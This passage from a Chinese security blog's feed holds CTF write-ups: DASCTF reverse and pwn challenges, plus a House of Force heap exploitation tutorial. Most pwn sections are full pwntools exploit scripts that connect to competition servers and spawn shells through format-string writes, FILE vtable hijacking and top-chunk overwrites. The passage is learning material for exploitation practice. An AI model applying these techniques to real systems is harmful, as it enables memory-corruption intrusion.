class="hljs-string">''</span>).join(d)<span class="hljs-keyword">if</span> ohh == a:    print <span class="hljs-string">'great!waht u input is the flag u wanna get.'</span><span class="hljs-keyword">else</span>:    print <span class="hljs-string">'pity!'</span>%</code></pre></div><p>反编译后这题就十分简单了。</p><p>给的字符串把“a”，去除后解码base64即可。</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>直接去hex下提取迷宫，由于是100个字符，很容易联想到是10x10的迷宫。<br>然后丢vscode。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>直接路径就出来了。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attribute">jkkjjhjjkjjkkkuukukkuuhhhuukkk</span></code></pre></div><p>Md5一下即可。</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在<code>Strcmp</code>。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>考点就是堆上的格式化字符串利用，挺简单的。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p> 利用环境变量那条链，进行攻击<code>ret address</code>，修改为one gadget<br>给了8次漏洞利用机会，还是很容易实现的。其中<code>ret address</code>，为<code>__libc_start_main+xxx</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./springboard'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10029</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"1"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"2"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"3"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"%13$pAAAA%11$p"</span>)sleep(<span class="hljs-number">0.1</span>)ru(<span class="hljs-string">"0x"</span>)tag = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xe0</span>ru(<span class="hljs-string">"AAAA0x"</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) <span class="hljs-number">-0x21b97</span>info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)key1 = hex(tag)[<span class="hljs-number">-4</span>:]print(key1)payload = <span class="hljs-string">'%&#123;&#125;c%13$hn'</span>.format(int(key1,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)rec = rce18[<span class="hljs-number">1</span>] + libc_basekey2 = hex(rec)[<span class="hljs-number">-4</span>:]print(key2)payload = <span class="hljs-string">'%&#123;&#125;c%39$hn'</span>.format(int(key2,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)key3 = int(hex(tag)[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>) + <span class="hljs-number">2</span>print(key3)payload = <span class="hljs-string">'%&#123;&#125;c%13$hhn'</span>.format(key3)sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)key4 = hex(rec)[<span class="hljs-number">-6</span>:<span class="hljs-number">-4</span>]print(key4)payload = <span class="hljs-string">'%&#123;&#125;c%39$hhn'</span>.format(int(key4,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)itr()<span class="hljs-comment"># 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)</span><span class="hljs-comment"># 0008| 0x7fffffffe2f8 --&gt; 0x55554780</span><span class="hljs-comment"># 0016| 0x7fffffffe300 --&gt; 0x555555756010 ("11111111aaaaaaaa1111111122222222\n")</span><span class="hljs-comment"># 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00</span><span class="hljs-comment"># 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)</span><span class="hljs-comment"># 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)</span><span class="hljs-comment"># 0048| 0x7fffffffe320 --&gt; 0x1</span><span class="hljs-comment"># 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a ("/media/psf/mypwn/ahys/6/springboard/springboard")</span><span class="hljs-comment"># 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0</span><span class="hljs-comment"># 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)</span><span class="hljs-comment"># 0080| 0x7fffffffe340 --&gt; 0x0</span><span class="hljs-comment"># 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42</span><span class="hljs-comment"># 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)</span><span class="hljs-comment"># 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1</span><span class="hljs-comment"># 0112| 0x7fffffffe360 --&gt; 0x0</span><span class="hljs-comment"># 0120| 0x7fffffffe368 --&gt; 0x0</span><span class="hljs-comment"># 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42</span><span class="hljs-comment"># 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42</span><span class="hljs-comment"># 0144| 0x7fffffffe380 --&gt; 0x0</span><span class="hljs-comment"># 0152| 0x7fffffffe388 --&gt; 0x0</span><span class="hljs-comment"># 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</span></code></pre></div><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>考点就是<code>IO_FILE</code>的相关知识了，是针对伪造 vtable 劫持程序流程。</p><p>这个题估计是参考<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情）</p><h4 id="fclose-函数调用的-vtable-函数"><a href="#fclose-函数调用的-vtable-函数" class="headerlink" title="fclose 函数调用的 vtable 函数"></a>fclose 函数调用的 vtable 函数</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p><p>vtable 函数 指针：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">/* The 'finish' function does any final cleaning up of an _IO_FILE object.   It does not delete (free) it, but does everything else to finalize it.   It matches the streambuf::~streambuf virtual destructor.  */</span>typedef void (*_IO_finish_t) (FILE *, <span class="hljs-built_in">int</span>); <span class="hljs-comment">/* finalize */</span>#define <span class="hljs-constructor">_IO_FINISH(FP)</span> JUMP1 (__finish, FP, <span class="hljs-number">0</span>)#define <span class="hljs-constructor">_IO_WFINISH(FP)</span> WJUMP1 (__finish, FP, <span class="hljs-number">0</span>)<span class="hljs-keyword">struct</span> _IO_jump_t&#123;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">size_t</span>, <span class="hljs-params">__dummy</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">size_t</span>, <span class="hljs-params">__dummy2</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_finish_t</span>, <span class="hljs-params">__finish</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_overflow_t</span>, <span class="hljs-params">__overflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_underflow_t</span>, <span class="hljs-params">__underflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_underflow_t</span>, <span class="hljs-params">__uflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_pbackfail_t</span>, <span class="hljs-params">__pbackfail</span>)</span>;    <span class="hljs-comment">/* showmany */</span>    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_xsputn_t</span>, <span class="hljs-params">__xsputn</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_xsgetn_t</span>, <span class="hljs-params">__xsgetn</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seekoff_t</span>, <span class="hljs-params">__seekoff</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seekpos_t</span>, <span class="hljs-params">__seekpos</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_setbuf_t</span>, <span class="hljs-params">__setbuf</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_sync_t</span>, <span class="hljs-params">__sync</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_doallocate_t</span>, <span class="hljs-params">__doallocate</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_read_t</span>, <span class="hljs-params">__read</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_write_t</span>, <span class="hljs-params">__write</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seek_t</span>, <span class="hljs-params">__seek</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_close_t</span>, <span class="hljs-params">__close</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_stat_t</span>, <span class="hljs-params">__stat</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_showmanyc_t</span>, <span class="hljs-params">__showmanyc</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_imbue_t</span>, <span class="hljs-params">__imbue</span>)</span>;&#125;;</code></pre></div><p>对于攻击的vtable 函数 指针其中的：</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 <code>__finish__</code>就可以了。</p><h4 id="libc2-29中的vtable"><a href="#libc2-29中的vtable" class="headerlink" title="libc2.29中的vtable"></a>libc2.29中的vtable</h4><p>vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。</p><p><strong>在glibc 2.23以及glibc 2.27其都是不可写的</strong>。</p><p>正是因为可以写，所以这个题难度就降低了很多。</p><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>利用程序的最后一次任意地址写，直接把<code>__IO_2_1_stderr的vtable</code>上<code>__finish__</code>指针修改为one gadget。<br>（这里的one gadget，需要自己多试）。</p><h5 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h5><p>第2次的2字节读入可以直接用其本来地址末2字节即可，直接在<code>__IO_2_1_stderr的vtable</code>不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个<code>\x60</code>一个字节即可。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./secret'</span>local_libc  = <span class="hljs-string">'/usr/lib/x86_64-linux-gnu/libc-2.29.so'</span>remote_libc = <span class="hljs-string">'./libc6_2.29-0ubuntu2_amd64.so'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10030</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()ru(<span class="hljs-string">"0x"</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">"printf"</span>]info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)ru(<span class="hljs-string">"addr"</span>)vtable = <span class="hljs-number">0x1e5758</span> + libc_bases(p64(vtable))sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment"># debug()</span>s(<span class="hljs-string">'\x60'</span>)sleep(<span class="hljs-number">0.1</span>)rec = <span class="hljs-number">0xe2386</span> + libc_bases(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)+p64(rec))itr()</code></pre></div><p>由于提前就<code>fclose(stdout)</code>,getshell以后也不会有任何的输出，所以得用<code>exec 1&gt;&amp;2</code>来恢复输出。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-6th&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-6th&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛(6th)&quot;&gt;&lt;/a&gt;DASCTF安恒月赛(6th)&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;#R
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>House of Force</title>
    <link href="http://chumen77.xyz/2020/05/13/House%20of%20Force/"/>
    <id>http://chumen77.xyz/2020/05/13/House of Force/</id>
    <published>2020-05-13T13:30:55.952Z</published>
    <updated>2020-09-16T15:23:01.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本按照这wiki上面学的，简单记录一下。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3>House Of Force 产生的原因在于 glibc 对 top chunk 的处理：进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</li></ul><p>所以当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么?答案是,可以使得 top chunk指向我们期望的任何位置,这就相当于一次任意地址写。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span>victim = av-&gt;top;<span class="hljs-built_in">size</span>   = chunksize(victim);<span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><span class="hljs-built_in">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (<span class="hljs-built_in">size</span>) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) &#123;    remainder_size = <span class="hljs-built_in">size</span> - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);    alloc_perturb(p, bytes);    <span class="hljs-built_in">return</span> p;&#125;</code></pre></div><p>所以，如果可以篡改 size 为一个很大值,就可以轻松的通过这个验证,这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。</p><h2 id="一般的利用办法"><a href="#一般的利用办法" class="headerlink" title="一般的利用办法"></a>一般的利用办法</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">remainder      = chunk<span class="hljs-constructor">_at_offset(<span class="hljs-params">victim</span>, <span class="hljs-params">nb</span>)</span>;av-&gt;top        = remainder;<span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span>#define chunk<span class="hljs-constructor">_at_offset(<span class="hljs-params">p</span>, <span class="hljs-params">s</span>)</span> ((mchunkptr)(((<span class="hljs-built_in">char</span> *) (p)) + (s)))</code></pre></div><p>之后这里会把 top chunk的 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p><h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容"><a href="#让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容" class="headerlink" title="让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容"></a>让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>这个核心就是来缩小top chunk 的指针，来修改位于其上面(低地址) 的某处中的内容。这里可能是heap的指针，got表。<strong>通常应该都是打heap，因为heap的地址是相对的，不会收到地址随机化的影响。而打got的话，堆的地址是随机的，并无法确定申请多少size 大小的堆，可以攻击到got</strong></p><p><strong>这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下<code>SIZE_SZ</code>（64位是8 ，32位是4）。</strong></p><h3 id="让那个top-chunk-指针增大来修改位于高地址空间的内容"><a href="#让那个top-chunk-指针增大来修改位于高地址空间的内容" class="headerlink" title="让那个top chunk 指针增大来修改位于高地址空间的内容"></a>让那个top chunk 指针增大来修改位于高地址空间的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>这个是较好理解的，常用修改libc上面某处的地址。</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li><li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li><li>覆盖 goodbye-message 为magic 函数地址来控制程序执行流。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bamboobox'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25784</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'item name:'</span>,str(size))    sa(<span class="hljs-string">'item'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'item'</span>,str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(id,size,content)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'item'</span>,str(id))    sla(<span class="hljs-string">'item name'</span>,str(size))    sa(<span class="hljs-string">'item'</span>,str(content))context.log_level = <span class="hljs-string">'debug'</span>magic = <span class="hljs-number">0x400d49</span>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">'chum'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x30</span> +p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,payload)size = -(<span class="hljs-number">0x40</span> + <span class="hljs-number">0x20</span>) - <span class="hljs-number">0x10</span>add(size,<span class="hljs-string">' '</span>)payload = p64(<span class="hljs-number">0x400d49</span>) + p64(<span class="hljs-number">0x400d49</span>)add(<span class="hljs-number">0x10</span>,payload)<span class="hljs-comment"># sla('choice:','5')</span>itr()</code></pre></div><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。</li><li>HOF</li><li><code>__malloc_hook</code> + one gadget</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>local_file  = <span class="hljs-string">'./gyctf_2020_force'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29457</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         